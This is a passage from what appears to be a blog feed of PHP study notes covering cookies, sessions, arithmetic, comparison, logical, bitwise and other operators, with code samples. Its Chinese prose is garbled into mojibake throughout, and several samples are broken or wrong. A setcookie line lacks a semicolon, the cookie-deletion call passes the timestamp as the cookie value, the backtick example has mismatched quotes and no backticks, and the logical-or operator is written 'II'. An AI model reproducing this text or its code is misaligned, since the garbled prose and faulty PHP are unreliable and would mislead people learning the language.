class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><ol start="2"><li>åœ¨æœåŠ¡å™¨ç«¯ä¸Šè¯»å–Cookieçš„å†…å®¹<br>PHP çš„ <code>$_COOKIE</code> å˜é‡ç”¨äºå–å› cookie çš„å€¼ã€‚<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// è¾“å‡º cookie å€¼</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;user&quot;</span>];<br><span class="hljs-comment">// æŸ¥çœ‹æ‰€æœ‰ cookie</span><br>print_r(<span class="hljs-variable">$_COOKIE</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li><li>å¤šç»´æ•°ç»„åº”ç”¨äºCookieä¸­</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>setcookie(<span class="hljs-string">&quot;member[name]&quot;</span>,<span class="hljs-string">&#x27;zhangsan&#x27;</span>,time()+<span class="hljs-number">60</span>*<span class="hljs-number">60</span>)<br>setcookie(<span class="hljs-string">&quot;member[email]&quot;</span>,<span class="hljs-string">&#x27;666666@qq.com&#x27;</span>,time()+<span class="hljs-number">60</span>*<span class="hljs-number">60</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ol start="4"><li>åˆ é™¤Cookie</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// è®¾ç½® cookie è¿‡æœŸæ—¶é—´ä¸ºè¿‡å» 1 å°æ—¶</span><br>setcookie(<span class="hljs-string">&quot;member&quot;</span>,time()<span class="hljs-number">-3600</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>äºŒã€session</p><blockquote><p>æ‚¨åœ¨è®¡ç®—æœºä¸Šæ“ä½œæŸä¸ªåº”ç”¨ç¨‹åºæ—¶ï¼Œæ‚¨æ‰“å¼€å®ƒï¼Œåšäº›æ›´æ”¹ï¼Œç„¶åå…³é—­å®ƒã€‚è¿™å¾ˆåƒä¸€æ¬¡å¯¹è¯ï¼ˆSessionï¼‰ã€‚è®¡ç®—æœºçŸ¥é“æ‚¨æ˜¯è°ã€‚å®ƒæ¸…æ¥šæ‚¨åœ¨ä½•æ—¶æ‰“å¼€å’Œå…³é—­åº”ç”¨ç¨‹åºã€‚ç„¶è€Œï¼Œåœ¨å› ç‰¹ç½‘ä¸Šé—®é¢˜å‡ºç°äº†ï¼šç”±äºHTTP åœ°å€æ— æ³•ä¿æŒçŠ¶æ€ï¼ŒWeb æœåŠ¡å™¨å¹¶ä¸çŸ¥é“æ‚¨æ˜¯è°ä»¥åŠæ‚¨åšäº†ä»€ä¹ˆã€‚<br>PHP session è§£å†³äº†è¿™ä¸ªé—®é¢˜ï¼Œå®ƒé€šè¿‡åœ¨æœåŠ¡å™¨ä¸Šå­˜å‚¨ç”¨æˆ·ä¿¡æ¯ä»¥ä¾¿éšåä½¿ç”¨ï¼ˆæ¯”å¦‚ç”¨æˆ·åç§°ã€è´­ä¹°å•†å“ç­‰ï¼‰ã€‚ç„¶è€Œï¼Œä¼šè¯ä¿¡æ¯æ˜¯ä¸´æ—¶çš„ï¼Œåœ¨ç”¨æˆ·ç¦»å¼€ç½‘ç«™åå°†è¢«åˆ é™¤ã€‚å¦‚æœæ‚¨éœ€è¦æ°¸ä¹…å­˜å‚¨ä¿¡æ¯ï¼Œå¯ä»¥æŠŠæ•°æ®å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ã€‚</p><p>Session çš„å·¥ä½œæœºåˆ¶æ˜¯ï¼šä¸ºæ¯ä¸ªè®¿å®¢åˆ›å»ºä¸€ä¸ªå”¯ä¸€çš„ id (UID)ï¼Œå¹¶åŸºäºè¿™ä¸ª UID æ¥å­˜å‚¨å˜é‡ã€‚UID å­˜å‚¨åœ¨ cookieä¸­ï¼Œæˆ–è€…é€šè¿‡ URL è¿›è¡Œä¼ å¯¼ã€‚</p></blockquote><ol><li>å¼€å¯session</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>session_start(); <span class="hljs-comment">//å¼ƒå¯ä¸€ä¸ªä¼šè¯ï¼Œæˆ–è€…è¿”å›å·²ç»å­˜åœ¨çš„ä¼šè¯</span><br><span class="hljs-meta">?&gt;</span>;<br></code></pre></td></tr></table></figure><ol start="2"><li>ä½¿ç”¨sessionå­˜å‚¨æ•°æ®</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>session_start();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>]=<span class="hljs-string">&#x27;zhangsan&#x27;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;email&#x27;</span>]=<span class="hljs-string">&#x27;666666@qq.com&#x27;</span>;<br><span class="hljs-meta">?&gt;</span>;<br></code></pre></td></tr></table></figure><ol start="3"><li>æ³¨é”€å˜é‡ä¸é”€æ¯session<br>åˆ é™¤æŸäº› session æ•°æ®ï¼Œå¯ä»¥ä½¿ç”¨ <code>unset()</code> æˆ– <code>session_destroy()</code> å‡½æ•°ã€‚</li></ol><p>å®ä¾‹1ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>session_start();<span class="hljs-comment">//æ‰“å¼€è¦é”€æ¯çš„ä¼šè¯!</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;views&#x27;</span>]))<br>&#123;<br>   <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;views&#x27;</span>]);<span class="hljs-comment">//Free all session variables</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å®ä¾‹2ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>session_destroy();<span class="hljs-comment">//é”€æ¯ä¸€ä¸ªä¼šè¯ä¸­çš„å…¨éƒ¨æ•°æ®</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ç¼–ç¨‹å¼€å‘</category>
      
      <category>PHP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP è¿ç®—ç¬¦</title>
    <link href="/2020/05/22/PHP%20%E8%BF%90%E7%AE%97%E7%AC%A6/"/>
    <url>/2020/05/22/PHP%20%E8%BF%90%E7%AE%97%E7%AC%A6/</url>
    
    <content type="html"><![CDATA[<p>æ‘˜è¦ï¼šPHPå­¦ä¹ ç¬”è®°ï¼ˆäºŒï¼‰</p> <a id="more"></a><h2 id="ç®—æ•°è¿ç®—ç¬¦"><a href="#ç®—æ•°è¿ç®—ç¬¦" class="headerlink" title="ç®—æ•°è¿ç®—ç¬¦"></a>ç®—æ•°è¿ç®—ç¬¦</h2><table><thead><tr><th>ä¾‹å­</th><th>åç§°</th><th>ç»“æœ</th></tr></thead><tbody><tr><td>-$a</td><td>å–å</td><td>açš„ç›¸åæ•°</td></tr><tr><td>$a + $b</td><td>åŠ æ³•</td><td>a å’Œaå’Œb çš„å’Œ</td></tr><tr><td>$a - $b</td><td>å‡æ³•</td><td>a å’Œaå’Œb çš„å·®</td></tr><tr><td>$a * $b</td><td>ä¹˜æ³•</td><td>a å’Œaå’Œb çš„ç§¯</td></tr><tr><td>$a / $b</td><td>é™¤æ³•</td><td>a å’Œaå’Œb çš„å•†</td></tr><tr><td>$a % $b</td><td>å–ä½™</td><td>a é™¤ä»¥aé™¤ä»¥b çš„ä½™æ•°</td></tr><tr><td>$a ** $b</td><td>ä¹˜æ–¹</td><td>a çš„açš„b æ¬¡æ–¹</td></tr><tr><td>++$a</td><td>å‰åŠ </td><td>açš„å€¼åŠ 1ï¼Œç„¶åè¿”å›a</td></tr><tr><td>$a ++</td><td>ååŠ </td><td>è¿”å›a,ç„¶åå°†açš„å€¼åŠ 1</td></tr><tr><td>â€“$a</td><td>å‰å‡</td><td>açš„å€¼å‡1ï¼Œç„¶åè¿”å›a</td></tr><tr><td>$aâ€“</td><td>åå‡</td><td>è¿”å›a,ç„¶åå°†açš„å€¼å‡1</td></tr></tbody></table><h2 id="å­—ç¬¦ä¸²è¿ç®—ç¬¦"><a href="#å­—ç¬¦ä¸²è¿ç®—ç¬¦" class="headerlink" title="å­—ç¬¦ä¸²è¿ç®—ç¬¦"></a>å­—ç¬¦ä¸²è¿ç®—ç¬¦</h2><p>æœ‰ä¸¤ä¸ªå­—ç¬¦ä¸²è¿ç®—ç¬¦ã€‚</p><p>ç¬¬ä¸€ä¸ªæ˜¯è¿æ¥è¿ç®—ç¬¦<font color=#FF0000 size=3>.</font>ï¼Œå®ƒè¿”å›å…¶å·¦å³å‚æ•°è¿æ¥åçš„å­—ç¬¦ä¸²<br>ç¬¬äºŒä¸ªæ˜¯è¿æ¥èµ‹å€¼è¿ç®—ç¬¦<font color=#FF0000 size=3>.=</font>ï¼Œå®ƒå°†å³è¾¹å‚æ•°é™„åŠ åˆ°å·¦è¾¹çš„å‚æ•°åã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;Hello &quot;</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$a</span> . <span class="hljs-string">&quot;PHP!&quot;</span>; <span class="hljs-comment">// now $b contains &quot;Hello World!&quot;</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;Hello &quot;</span>;<br><span class="hljs-variable">$a</span> .= <span class="hljs-string">&quot;World!&quot;</span>;     <span class="hljs-comment">// now $a contains &quot;Hello World!&quot;</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Hello PHP!Hello World!<br></code></pre></td></tr></table></figure><h2 id="èµ‹å€¼è¿ç®—ç¬¦"><a href="#èµ‹å€¼è¿ç®—ç¬¦" class="headerlink" title="èµ‹å€¼è¿ç®—ç¬¦"></a>èµ‹å€¼è¿ç®—ç¬¦</h2><p>å·¦è¾¹çš„æ“ä½œæ•°å¿…é¡»æ˜¯å˜é‡,å³è¾¹å¯ä»¥æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªå€¼ï¼Œä¸€ä¸ªå˜é‡ç­‰ç­‰ã€‚</p><p>ä½œç”¨:å°†å³è¾¹è¡¨è¾¾å¼çš„å€¼èµ‹çµ¦å·¦è¾¹å˜é‡</p><blockquote><p>èµ‹å€¼+=  ï¼Œæ¯”å¦‚a+=b,å°±æ˜¯a=a+bã€‚<br>èµ‹å€¼-=  ï¼Œæ¯”å¦‚a-=b,å°±æ˜¯a=a-b<br>èµ‹å€¼*=  ï¼Œæ¯”å¦‚a*=b,å°±æ˜¯a=a*b<br>èµ‹å€¼/=  ï¼Œæ¯”å¦‚a/=b,å°±æ˜¯a=a/b<br>èµ‹å€¼%=  ï¼Œæ¯”å¦‚a%=b,å°±æ˜¯a=a%b</p></blockquote><h2 id="æ¯”è¾ƒè¿ç®—ç¬¦"><a href="#æ¯”è¾ƒè¿ç®—ç¬¦" class="headerlink" title="æ¯”è¾ƒè¿ç®—ç¬¦"></a>æ¯”è¾ƒè¿ç®—ç¬¦</h2><p>æ¯”è¾ƒè¿ç®—ç¬¦ä¹Ÿç§°å…³ç³»è¿ç®—ç¬¦ï¼Œåˆç§°æ¡ä»¶è¿ç®—ç¬¦,ç”¨äºå¯¹è¿ç®—ç¬¦ä¸¤è¾¹çš„æ“ä½œæ•°è¿›è¡Œæ¯”è¾ƒ<br>æ¯”è¾ƒçš„ç»“æœåªèƒ½æ˜¯å¸ƒå°”å€¼ã€‚å¯¹æ“ä½œæ•°(æŒ‰ç…§æ¯”è¾ƒè¿ç®—ç¬¦çš„è¦æ±‚è§„åˆ™)è¿›è¡Œæ¯”è¾ƒã€‚å¦‚æœæ¯”è¾ƒå‡ºçš„ç»“æœæ»¡è¶³æ¯”è¾ƒè¿ç®—ç¬¦çš„è¦æ±‚é‚£ä¹ˆç»“æœå°±æ˜¯true(çœŸï¼Œæˆç«‹ï¼Œæ»¡è¶³),å¦åˆ™å°±æ˜¯false(å‡ï¼Œä¸æˆç«‹,ä¸æ»¡è¶³)</p><table><thead><tr><th></th><th>è¡¨è¾¾å¼</th><th>å«ä¹‰</th><th>ç»“æœ</th><th></th></tr></thead><tbody><tr><td></td><td>$a == $b</td><td>ç­‰äº</td><td>å¦‚æœç±»å‹è½¬æ¢å a ç­‰äºaç­‰äºbï¼Œè¿”å› trueã€‚</td><td></td></tr><tr><td></td><td>$a === $b</td><td>å…¨ç­‰</td><td>å¦‚æœ a ç­‰äºaç­‰äºbï¼Œå¹¶ä¸”å®ƒä»¬çš„ç±»å‹ä¹Ÿç›¸åŒï¼Œè¿”å›trueã€‚</td><td></td></tr><tr><td></td><td>$a != $b</td><td>ä¸ç­‰</td><td>å¦‚æœç±»å‹è½¬æ¢å a ä¸ç­‰äºaä¸ç­‰äºbï¼Œè¿”å› trueã€‚</td><td></td></tr><tr><td></td><td>$a &lt;&gt; $b</td><td>ä¸ç­‰</td><td>å¦‚æœç±»å‹è½¬æ¢å a ä¸ç­‰äºaä¸ç­‰äºbï¼Œè¿”å›trueã€‚</td><td></td></tr><tr><td></td><td>$a !== $b</td><td>ä¸å…¨ç­‰</td><td>å¦‚æœ a å’Œaå’Œb çš„å€¼æˆ–ç±»å‹ä¸åŒï¼Œè¿”å› trueã€‚</td><td></td></tr><tr><td></td><td>$a &lt; $b</td><td>å°äº</td><td>å¦‚æœ a å°äºaå°äºbï¼Œè¿”å› trueã€‚</td><td></td></tr><tr><td></td><td>$a &gt; $b</td><td>å¤§äº</td><td>å¦‚æœ a å¤§äºaå¤§äºbï¼Œè¿”å› trueã€‚</td><td></td></tr><tr><td></td><td>$a &lt;= $b</td><td>å°äºç­‰äº</td><td>å¦‚æœ a å°äºæˆ–è€…ç­‰äºaå°äºæˆ–è€…ç­‰äºbï¼Œè¿”å›trueã€‚</td><td></td></tr><tr><td></td><td>$a &gt;= $b</td><td>å¤§äºç­‰äº</td><td>å¦‚æœ a å¤§äºæˆ–è€…ç­‰äºaå¤§äºæˆ–è€…ç­‰äºbï¼Œè¿”å› trueã€‚</td><td></td></tr></tbody></table><p>ä¾‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-number">11</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;11&#x27;</span> ;<br><span class="hljs-comment">//var_dump($a==$b) ;//true</span><br>var_dump(<span class="hljs-variable">$a</span>===<span class="hljs-variable">$b</span>) ;<span class="hljs-comment">//false</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="é€»è¾‘è¿ç®—ç¬¦"><a href="#é€»è¾‘è¿ç®—ç¬¦" class="headerlink" title="é€»è¾‘è¿ç®—ç¬¦"></a>é€»è¾‘è¿ç®—ç¬¦</h2><p>å¯¹è¡¨è¾¾å¼è¿›è¡Œé€»è¾‘è¿ç®—ï¼Œè¿ç®—å‡ºçš„ç»“æœæ˜¯å¸ƒå°”ç±»å‹çš„å€¼(true, false)</p><p> è¦æ±‚:å‚ä¸é€»è¾‘è¿ç®—çš„è¡¨è¾¾å¼çš„å€¼æ˜¯å¸ƒå°”ç±»å‹çš„å€¼ï¼Œå¦‚æœä¸æ˜¯å¸ƒå°”ç±»å‹çš„å€¼ä¼šè¢«è‡ªåŠ¨è½¬æ¢æˆå¸ƒå°”ç±»å‹çš„å€¼ï¼Œç„¶åå†å‚ä¸è¿ç®—!</p><table><thead><tr><th></th><th>è¡¨è¾¾å¼</th><th>å«ä¹‰</th><th>ç»“æœ</th><th></th></tr></thead><tbody><tr><td></td><td>$a and $b</td><td>and(é€»è¾‘ä¸)</td><td>å½“ä¸¤è¾¹æ“ä½œæ•°éƒ½ä¸ºtrueæ—¶ï¼Œè¿”å›trueï¼Œå¦åˆ™è¿”å›false</td><td></td></tr><tr><td></td><td>$a or $b</td><td>or (é€»è¾‘æˆ–)</td><td>å½“ä¸¤è¾¹æ“ä½œéƒ½ä¸ºfalseæ—¶ï¼Œè¿”å›falseï¼Œå¦åˆ™è¿”å›true</td><td></td></tr><tr><td></td><td>$a xor $b</td><td>xor (é€»è¾‘å¼‚æˆ–)</td><td>å½“ä¸¤è¾¹æ“ä½œæ•°åªæœ‰ä¸€ä¸ªä¸ºtrueæ—¶ï¼Œè¿”å›trueï¼Œå¦åˆ™è¿”å›false</td><td></td></tr><tr><td></td><td>!$a</td><td>not (é€»è¾‘é)</td><td>å½“æ“ä½œä¸ºtrueæ—¶è¿”å›falseï¼Œå¦åˆ™è¿”å›true</td><td></td></tr><tr><td></td><td>$a &amp;&amp; $b</td><td>and(é€»è¾‘ä¸)</td><td>å½“ä¸¤è¾¹æ“ä½œæ•°éƒ½ä¸ºtrueæ—¶ï¼Œè¿”å›trueï¼Œå¦åˆ™è¿”å›false</td><td></td></tr><tr><td></td><td>$a II $b</td><td>or (é€»è¾‘æˆ–)</td><td>å½“ä¸¤è¾¹æ“ä½œéƒ½ä¸ºfalseæ—¶ï¼Œè¿”å›falseï¼Œå¦åˆ™è¿”å›true</td><td></td></tr></tbody></table><h2 id="ä½è¿ç®—ç¬¦"><a href="#ä½è¿ç®—ç¬¦" class="headerlink" title="ä½è¿ç®—ç¬¦"></a>ä½è¿ç®—ç¬¦</h2><ol><li><p><font color=#ff0000 size=3>&amp;</font>    æŒ‰ä½ä¸<br>åªæœ‰å‚ä¸è¿ç®—çš„ä¸¤ä½éƒ½ä¸º1æ—¶ï¼Œè¿ç®—ç»“æœæ‰ä¸º1ï¼Œå¦åˆ™ä¸º0</p></li><li><p><font color=#ff0000 size=3>|    </font> æŒ‰ä½æˆ–<br>åªæœ‰å‚ä¸è¿ç®—çš„ä¸¤ä½éƒ½ä¸º0æ—¶ï¼Œè¿ç®—ç»“æœæ‰ä¸º0ï¼Œå¦åˆ™ä¸º1</p></li><li><p><font color=#ff0000 size=3>^</font>    æŒ‰ä½å¼‚æˆ–<br>åªæœ‰å‚ä¸è¿ç®—çš„ä¸¤ä½ä¸åŒï¼Œè¿ç®—ç»“æœæ‰ä¸º1ï¼Œå¦åˆ™ä¸º0</p></li><li><p><font color=#ff0000 size=3>~</font>    æŒ‰ä½é<br> å°†äºŒè¿›åˆ¶è¡¨ç¤ºçš„æ“ä½œæ•°ä¸­çš„1å˜æˆ0ï¼Œ0å˜æˆ1</p></li><li><p><font color=#ff0000 size=3>&lt;&lt;</font>    å·¦ç§»<br> å°†å·¦è¾¹çš„æ“ä½œæ•°åœ¨å†…å­˜ä¸­çš„äºŒè¿›åˆ¶æ•°æ®å·¦ç§»å³è¾¹æ“ä½œæ•°æŒ‡å®šçš„ä½æ•°ï¼Œå³è¾¹ç§»ç©ºçš„éƒ¨åˆ†è¡¥ä¸Š0</p></li><li><p><font color=#ff0000 size=3>&gt;&gt;</font>å³ç§»<br>å°†å·¦è¾¹çš„æ“ä½œæ•°åœ¨å†…å­˜ä¸­çš„äºŒè¿›åˆ¶æ•°æ®å³ç§»å³è¾¹æ“ä½œæ•°æŒ‡å®šçš„ä½æ•°ï¼Œå·¦è¾¹ç§»ç©ºçš„éƒ¨åˆ†è¡¥ä¸Š0</p></li></ol><h2 id="å…¶ä»–è¿ç®—ç¬¦"><a href="#å…¶ä»–è¿ç®—ç¬¦" class="headerlink" title="å…¶ä»–è¿ç®—ç¬¦"></a>å…¶ä»–è¿ç®—ç¬¦</h2><table><thead><tr><th>è¿ç®—ç¬¦</th><th>è§£é‡Š</th></tr></thead><tbody><tr><td>ï¼Ÿï¼š</td><td>ä¸‰å…ƒè¿ç®—ç¬¦ï¼Œå¯ä»¥æä¾›ç®€å•çš„é€»è¾‘åˆ¤æ–­</td></tr><tr><td>``</td><td>åå¼•å· æ˜¯æ‰§è¡Œè¿ç®—ç¬¦ï¼Œphpå°†å°è¯•å°†åå¼•å·ä¸­çš„å†…å®¹ä½œä¸ºå¤–å£³å‘½ä»¤æ¥æ‰§è¡Œï¼Œå¹¶å°†å…¶è¾“</td></tr><tr><td>@</td><td>é”™è¯¯æ§åˆ¶è¿ç®—ç¬¦ï¼Œå½“å°†å…¶æ”¾ç½®åœ¨ä¸€ä¸ªphpè¡¨è¾¾å¼ä¹‹å‰ï¼Œè¯¥è¡¨è¾¾å¼å¯èƒ½äº§ç”Ÿçš„ä»»ä½•é”™è¯¯ä¿¡æ¯éƒ½å°†è¢«å¿½ç•¥æ‰</td></tr><tr><td>=&gt;</td><td>æ•°ç»„ä¸‹æ ‡æŒ‡å®šç¬¦å·ï¼Œé€šè¿‡æ­¤ç¬¦å·æŒ‡å®šæ•°ç»„çš„é”®ä¸å€¼</td></tr><tr><td>-&gt;</td><td>å¯¹è±¡æˆå‘˜è®¿é—®ç¬¦å·ï¼Œè®¿é—®å¯¹è±¡ä¸­çš„æˆå‘˜å±æ€§æˆ–æˆå‘˜æ–¹æ³•</td></tr><tr><td>instanceof</td><td>ç±»å‹è¿ç®—ç¬¦ï¼Œç”¨æ¥æµ‹å®šä¸€ä¸ªç»™å®šçš„å¯¹è±¡æ˜¯å¦æ¥è‡ªæŒ‡å®šçš„å¯¹è±¡ç±»</td></tr></tbody></table><ol><li>ï¼Ÿï¼š<br> ä¸‰å…ƒè¿ç®—<br>æ ¼å¼:   è¡¨è¾¾å¼1 ?è¡¨è¾¾å¼2 :è¡¨è¾¾å¼3;<br>å¦‚æœè¡¨è¾¾å¼1çš„å€¼ä¸ºtrue,é‚£ä¹ˆå°±æ‰§è¡Œè¡¨è¾¾å¼2,å¦åˆ™é‚£ä¹ˆå°±æ‰§è¡Œè¡¨è¾¾å¼3</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-literal">false</span> ? <span class="hljs-number">10</span> : <span class="hljs-number">20</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><ol start="2"><li>``<br>åå¼•å· æ˜¯æ‰§è¡Œè¿ç®—ç¬¦ï¼Œphpå°†å°è¯•å°†åå¼•å·ä¸­çš„å†…å®¹ä½œä¸ºå¤–å£³å‘½ä»¤æ¥æ‰§è¡Œï¼Œå¹¶å°†å…¶è¾“å…¥ä¿¡æ¯è¿”å›</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>= <span class="hljs-string">&quot; ipconfig&#x27;;</span><br><span class="hljs-string"><span class="hljs-subst">$b</span>=&#x27; ifconfig&#x27; ;</span><br><span class="hljs-string">var_dump(<span class="hljs-subst">$b</span>) ;</span><br><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot; ifconfig&quot;</span><br></code></pre></td></tr></table></figure><ol start="3"><li><p>@<br>é”™è¯¯æ§åˆ¶è¿ç®—ç¬¦ï¼Œå±è”½è¡¨è¾¾å¼å¯èƒ½å‘ç”Ÿé”™è¯¯!</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> @<span class="hljs-variable">$a</span>;<br></code></pre></td></tr></table></figure></li><li><p>=&gt;<br>æ•°ç»„ä¸‹æ ‡æŒ‡å®šç¬¦å·ï¼Œé€šè¿‡æ­¤ç¬¦å·æŒ‡å®šæ•°ç»„çš„é”®ä¸å€¼ã€‚=&gt;ç¬¦å·æ¥åˆ†éš”é”®å’Œå€¼ï¼Œå·¦ä¾§è¡¨ç¤ºé”®ï¼Œå³ä¾§è¡¨ç¤ºå€¼ã€‚</p></li><li><p>-&gt;<br>å¯¹è±¡æˆå‘˜è®¿é—®ç¬¦å·ï¼Œè®¿é—®å¯¹è±¡ä¸­çš„æˆå‘˜å±æ€§æˆ–æˆå‘˜æ–¹æ³•ã€‚-&gt;æ˜¯å¯¹è±¡æ‰§è¡Œæ–¹æ³•æˆ–å–å¾—å±æ€§ç”¨çš„ã€‚</p></li><li><p>instanceof<br>ç±»å‹è¿ç®—ç¬¦ï¼Œç”¨æ¥æµ‹å®šä¸€ä¸ªç»™å®šçš„å¯¹è±¡æ˜¯å¦æ¥è‡ªæŒ‡å®šçš„å¯¹è±¡ç±»</p></li></ol><h2 id="è¿ç®—ç¬¦çš„ä¼˜å…ˆçº§"><a href="#è¿ç®—ç¬¦çš„ä¼˜å…ˆçº§" class="headerlink" title="è¿ç®—ç¬¦çš„ä¼˜å…ˆçº§"></a>è¿ç®—ç¬¦çš„ä¼˜å…ˆçº§</h2><p>ä¼˜å…ˆçº§å½’çº³:.</p><ol><li>[æ— ]é€’å¢é€’å‡</li><li> [å³]é€»è¾‘é!</li><li>[å·¦]ä¹˜ï¼Œé™¤ï¼Œå–ä½™</li><li>[å·¦]åŠ ï¼Œå‡ï¼Œå­—ç¬¦ä¸²è¿æ¥ç¬¦</li><li>[æ— ]åŒ…å«å¤§äºå·æˆ–è€…å°äºå·çš„æ¯”è¾ƒè¿ç®—ç¬¦</li><li> [æ— ]ä¸åŒ…å«å¤§äºå·æˆ–è€…å°äºå·çš„æ¯”è¾ƒè¿ç®—ç¬¦</li><li>[å·¦]é€»è¾‘ä¸&amp;&amp;</li><li>[å·¦]é€»è¾‘æˆ–||</li><li>[å·¦]? :</li><li>[å³]èµ‹å€¼è¿ç®—ç¬¦</li><li>[åœ¨] é€»è¾‘å¼‚æˆ–xor</li></ol><blockquote><p>åœ†æ‹¬å·çš„ä½œç”¨:<br>ç”¨åœ†æ‹¬å·å¯ä»¥å°†è¡¨è¾¾å¼é‡Œé¢çš„æŸä¸€å—çœ‹æˆä¸€ä¸ªæ•´ä½“!ä½¿ç”¨æ‹¬å·å¯ä»¥å¢å¼ºä»£ç çš„å¯è¯»æ€§ã€‚</p></blockquote><p>  <strong>æ³¨æ„</strong><br>PHPä¸­è§„å®š:<br>ä½¿ç”¨echoè¾“å‡ºå¸ƒå°”ç±»å‹å€¼çš„æ—¶å€™<br>echo true;å®ƒåœ¨é¡µé¢ä¸­ä¼šè¾“å‡º1<br>echo false;å®ƒä¼šåœ¨é¡µé¢ä¸­ä»€ä¹ˆéƒ½ä¸è¾“å‡º<br>æ‰€ä»¥è¯´æˆ‘ä»¬åœ¨æµ‹è¯•çš„è¿‡ç¨‹ä¸­å¦‚æœéœ€è¦è¾“å‡ºå¸ƒå°”ç±»å‹å€¼çš„æ—¶å€™æˆ‘ä»¬æœ€å¥½ä½¿ç”¨var_dump()æ¥è¾“å‡ºæ›´æ˜äº†</p>]]></content>
    
    
    <categories>
      
